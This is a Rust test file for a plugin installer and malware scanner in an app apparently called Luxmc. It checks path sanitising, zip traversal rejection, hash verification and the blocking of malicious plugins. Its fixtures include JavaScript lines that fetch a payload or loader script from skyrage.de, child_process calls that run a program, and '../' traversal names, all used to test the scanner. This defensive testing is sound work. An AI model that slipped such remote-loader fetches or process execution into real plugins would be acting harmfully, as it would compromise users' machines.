use super::*;
use std::io::Write;

fn temp_root(tag: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("luxmc-plugins-{tag}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}


fn build_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buffer = Cursor::new(Vec::new());
    {
        let mut writer = zip::ZipWriter::new(&mut buffer);
        let options = zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
        for (name, content) in entries {
            writer.start_file(*name, options).unwrap();
            writer.write_all(content).unwrap();
        }
        writer.finish().unwrap();
    }
    buffer.into_inner()
}

fn manifest(id: &str) -> String {
    format!(r#"{{"id":"{id}","name":"{id}","version":"1.0.0","author":"Luxmc","main":"main.js","permissions":["storage"]}}"#)
}

#[test]
fn valid_id_rejects_unsafe_names() {
    assert!(valid_id("my-plugin"));
    assert!(valid_id("plugin.v2"));
    assert!(!valid_id("../plugin"));
    assert!(!valid_id(""));
    assert!(!valid_id(".hidden"));
    assert!(!valid_id("state"));
}

#[test]
fn sanitize_entry_normalizes_paths() {
    assert_eq!(sanitize_entry("a//b.js").as_deref(), Some("a/b.js"));
    assert_eq!(sanitize_entry("a\\b.js").as_deref(), Some("a/b.js"));
    assert!(sanitize_entry("../../x.js").is_none());
}

#[test]
fn scan_flags_known_iocs() {
    let mut files = BTreeMap::new();
    files.insert("main.js".to_string(), b"fetch('http://skyrage.de/payload')".to_vec());
    let scan = scan_files(&files);
    assert!(!scan.clean);
    assert!(scan.findings.iter().any(|finding| finding.code == "known_indicator"));
}

#[test]
fn scan_flags_child_process_usage() {
    let mut files = BTreeMap::new();
    files.insert("main.js".to_string(), b"const cp = require('child_process');".to_vec());
    let scan = scan_files(&files);
    assert!(!scan.clean);
    assert!(scan.findings.iter().any(|finding| finding.code == "exec_child_process"));
}

#[test]
fn scan_flags_obfuscated_payload() {
    let mut files = BTreeMap::new();
    files.insert("main.js".to_string(), format!("const a='{}';", "A".repeat(5000)).into_bytes());
    let scan = scan_files(&files);
    assert!(scan.clean);
    assert!(scan.findings.iter().any(|finding| finding.code == "obfuscated_payload"));
}

#[test]
fn scan_accepts_plain_plugin() {
    let mut files = BTreeMap::new();
    files.insert("plugin.json".to_string(), manifest("clean-one").into_bytes());
    files.insert("main.js".to_string(), b"export function onLoad(api) { api.toast('oi'); }".to_vec());
    let scan = scan_files(&files);
    assert!(scan.clean);
    assert!(scan.findings.is_empty());
    assert_eq!(scan.files, 2);
}

#[test]
fn strip_wrapper_unwraps_single_folder() {
    let mut files = BTreeMap::new();
    files.insert("my-plugin/plugin.json".to_string(), manifest("wrapped").into_bytes());
    files.insert("my-plugin/main.js".to_string(), b"export {}".to_vec());
    let files = strip_wrapper(files);
    assert!(files.contains_key("plugin.json"));
    assert!(files.contains_key("main.js"));
}

#[test]
fn parse_manifest_requires_main_file() {
    let mut files = BTreeMap::new();
    files.insert("plugin.json".to_string(), manifest("broken").into_bytes());
    assert!(parse_manifest(&files).is_err());
}

#[test]
fn parse_manifest_rejects_unknown_permissions() {
    let mut files = BTreeMap::new();
    files.insert(
        "plugin.json".to_string(),
        br#"{"id":"bad","name":"Bad","main":"main.js","permissions":["root"]}"#.to_vec(),
    );
    files.insert("main.js".to_string(), b"export {}".to_vec());
    assert!(parse_manifest(&files).is_err());
}

#[test]
fn read_entries_rejects_traversal() {
    let zip = build_zip(&[("../escape.js", b"x"), ("plugin.json", manifest("evil").as_bytes())]);
    let offset = find_zip_start(&zip).unwrap();
    assert!(read_entries(&zip[offset..]).is_err());
}

#[test]
fn read_entries_rejects_binary_files() {
    let zip = build_zip(&[("plugin.json", manifest("bin").as_bytes()), ("main.exe", b"MZ")]);
    let offset = find_zip_start(&zip).unwrap();
    assert!(read_entries(&zip[offset..]).is_err());
}

#[test]
fn install_rejects_non_zip() {
    let root = temp_root("nonzip");
    assert!(install_at(&root, b"not a zip at all", None).is_err());
}

#[test]
fn install_blocks_malicious_plugin() {
    let root = temp_root("malicious");
    let zip = build_zip(&[
        ("plugin.json", manifest("malicious").as_bytes()),
        ("main.js", b"fetch('https://skyrage.de/loader.js')"),
    ]);
    let error = install_at(&root, &zip, None).unwrap_err();
    assert!(format!("{error}").contains("Shield"));
    assert!(list_at(&root).unwrap().is_empty());
}

#[test]
fn install_verifies_sha256_and_persists() {
    let root = temp_root("hashed");
    let zip = build_zip(&[("plugin.json", manifest("hashed").as_bytes()), ("main.js", b"export function onLoad() {}")]);
    let offset = find_zip_start(&zip).unwrap();
    let digest = format!("{:x}", Sha256::digest(&zip[offset..]));
    let wrong = "0".repeat(64);
    assert!(install_at(&root, &zip, Some(&wrong)).is_err());
    let record = install_at(&root, &zip, Some(&digest)).unwrap();
    assert!(record.enabled);
    assert!(record.scan.clean);
    let listed = list_at(&root).unwrap();
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].manifest.id, "hashed");
    assert!(root.join("hashed/main.js").exists());
    let (manifest_out, script) = bundle_at(&root, "hashed").unwrap();
    assert_eq!(manifest_out.id, "hashed");
    assert!(script.contains("onLoad"));
}

#[test]
fn uninstall_removes_files_and_state() {
    let root = temp_root("uninstall");
    let zip = build_zip(&[("plugin.json", manifest("removable").as_bytes()), ("main.js", b"export {}")]);
    install_at(&root, &zip, None).unwrap();
    uninstall_at(&root, "removable").unwrap();
    assert!(list_at(&root).unwrap().is_empty());
    assert!(!root.join("removable").exists());
    assert!(uninstall_at(&root, "removable").is_err());
}

#[test]
fn disabling_blocks_bundle_and_reenable_rescans() {
    let root = temp_root("toggle");
    let zip = build_zip(&[("plugin.json", manifest("toggle").as_bytes()), ("main.js", b"export {}")]);
    install_at(&root, &zip, None).unwrap();
    let disabled = set_enabled_at(&root, "toggle", false).unwrap();
    assert!(!disabled.enabled);
    assert!(bundle_at(&root, "toggle").is_err());
    let enabled = set_enabled_at(&root, "toggle", true).unwrap();
    assert!(enabled.enabled);
    assert!(bundle_at(&root, "toggle").is_ok());
}

#[test]
fn tampered_plugin_is_blocked_on_reenable() {
    let root = temp_root("tamper");
    let zip = build_zip(&[("plugin.json", manifest("tamper").as_bytes()), ("main.js", b"export {}")]);
    install_at(&root, &zip, None).unwrap();
    set_enabled_at(&root, "tamper", false).unwrap();
    std::fs::write(root.join("tamper/main.js"), b"require('child_process').exec('calc')").unwrap();
    assert!(set_enabled_at(&root, "tamper", true).is_err());
    let listed = list_at(&root).unwrap();
    assert!(!listed[0].enabled);
    assert!(!listed[0].scan.clean);
}

#[test]
fn create_at_writes_manifest_and_source() {
    let root = temp_root("create");
    let record = create_at(&root, "my-tool", "Minha Ferramenta", "Pedro", "Teste", &["storage".to_string()], "window.Luxmc.ui.mount('<p>oi</p>');").unwrap();
    assert_eq!(record.manifest.id, "my-tool");
    assert_eq!(record.manifest.permissions, vec!["storage".to_string()]);
    assert!(record.enabled);
    assert_eq!(record.scan.files, 2);
    assert!(root.join("my-tool/plugin.json").exists());
    assert!(read_source_at(&root, "my-tool").unwrap().contains("mount"));
}

#[test]
fn create_at_rejects_duplicates_and_bad_ids() {
    let root = temp_root("dupe");
    create_at(&root, "dupe", "Dupe", "", "", &[], "export {}").unwrap();
    assert!(create_at(&root, "dupe", "Dupe", "", "", &[], "export {}").is_err());
    assert!(create_at(&root, "../evil", "Evil", "", "", &[], "export {}").is_err());
    assert!(create_at(&root, "no-name", "  ", "", "", &[], "export {}").is_err());
}

#[test]
fn create_at_blocks_malicious_source() {
    let root = temp_root("create-mal");
    assert!(create_at(&root, "bad", "Bad", "", "", &[], "require('child_process').exec('calc')").is_err());
    assert!(list_at(&root).unwrap().is_empty());
}

#[test]
fn update_source_replaces_and_rescans() {
    let root = temp_root("update-src");
    create_at(&root, "editable", "Editavel", "", "", &[], "export {}").unwrap();
    let updated = update_source_at(&root, "editable", "window.Luxmc.ui.toast('v2');").unwrap();
    assert!(updated.enabled);
    assert!(read_source_at(&root, "editable").unwrap().contains("v2"));
    let blocked = update_source_at(&root, "editable", "fetch('https://skyrage.de/x')");
    assert!(blocked.is_err());
    let listed = list_at(&root).unwrap();
    assert!(!listed[0].enabled);
    assert!(!listed[0].scan.clean);
}
